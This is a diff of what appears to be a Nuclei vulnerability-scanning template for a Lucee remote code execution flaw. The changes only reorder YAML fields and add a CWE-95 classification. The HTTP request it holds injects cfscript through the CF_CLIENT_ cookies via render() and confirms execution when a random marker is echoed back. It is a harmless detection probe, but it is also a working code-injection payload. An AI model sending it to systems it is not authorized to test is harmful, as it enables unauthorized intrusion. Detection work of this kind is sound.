@@ -1,30 +1,29 @@
 id: lucee-rce
-
 info:
   name: Lucee < 6.0.1.59 - Remote Code Execution
   author: rootxharsh,iamnoooob,pdresearch
   severity: critical
   reference:
     - https://blog.projectdiscovery.io/hello-lucee-let-us-hack-apple-again
+  classification:
+    cwe-id:
+      - CWE-95
   metadata:
     runzero-match: any(each(service["html.titles"]), {# matches "(?i)Lucee"})
-    verified: true
     max-request: 1
     shodan-query: http.title:"Lucee"
-  tags: lucee,rce,oast,vuln
-
+    verified: true
+  tags: lucee,oast,rce,vuln
 http:
-  - raw:
-      - |
-        GET / HTTP/1.1
-        Host: {{Hostname}}
-        Cookie: CF_CLIENT_=render('<cfscript>writeoutput(ToBinary("{{base64('{{randstr}}')}}"))</cfscript>'); CF_CLIENT_LUCEE=render('<cfscript>writeoutput(ToBinary("{{base64('{{randstr}}')}}"))</cfscript>');
-
-    matchers:
-      - type: dsl
+  - matchers:
+      - condition: and
         dsl:
           - contains(body, "{{randstr}}")
           - contains(header, "cfid")
           - contains(header, "cftoken")
-        condition: and
-
+        type: dsl
+    raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: CF_CLIENT_=render('<cfscript>writeoutput(ToBinary("{{base64('{{randstr}}')}}"))</cfscript>'); CF_CLIENT_LUCEE=render('<cfscript>writeoutput(ToBinary("{{base64('{{randstr}}')}}"))</cfscript>');
